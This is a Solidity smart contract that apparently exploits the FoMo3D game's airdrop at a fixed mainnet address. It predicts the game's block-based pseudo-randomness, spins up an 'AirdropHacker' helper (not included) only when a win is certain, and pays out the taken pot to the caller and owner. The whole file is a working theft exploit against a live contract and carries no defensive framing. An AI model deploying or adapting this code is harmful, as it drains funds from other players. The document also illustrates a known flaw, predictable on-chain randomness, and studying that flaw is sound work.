contract MainHub{
    using SafeMath for *;
    address public owner;
    bool public closed = false;
    FoMo3Dlong code = FoMo3Dlong(0x0aD3227eB47597b566EC138b3AfD78cFEA752de5);
    modifier onlyOwner{
        require(msg.sender==owner);
        _;
    }
    modifier onlyNotClosed{
        require(!closed);
        _;
    }
    constructor() public payable{
        require(msg.value==.1 ether);
        owner = msg.sender;
    }
    function attack() public onlyNotClosed{
        require(code.airDropPot_()>=.5 ether);  
        require(airdrop());
        uint256 initialBalance = address(this).balance;
        (new AirdropHacker).value(.1 ether)();
        uint256 postBalance = address(this).balance;
        uint256 takenAmount = postBalance - initialBalance;
        msg.sender.transfer(takenAmount*95/100);  
        require(address(this).balance>=.1 ether); 
    }
    function airdrop() private view returns(bool)
    {
        uint256 seed = uint256(keccak256(abi.encodePacked(
            (block.timestamp).add
            (block.difficulty).add
            ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add
            (block.gaslimit).add
            ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add
            (block.number)
        )));
        if((seed - ((seed / 1000) * 1000)) < code.airDropTracker_()) 
            return(true);
        else
            return(false);
    }
    function drain() public onlyOwner{
        closed = true;
        owner.transfer(address(this).balance); 
    }
    function() public payable{}
}
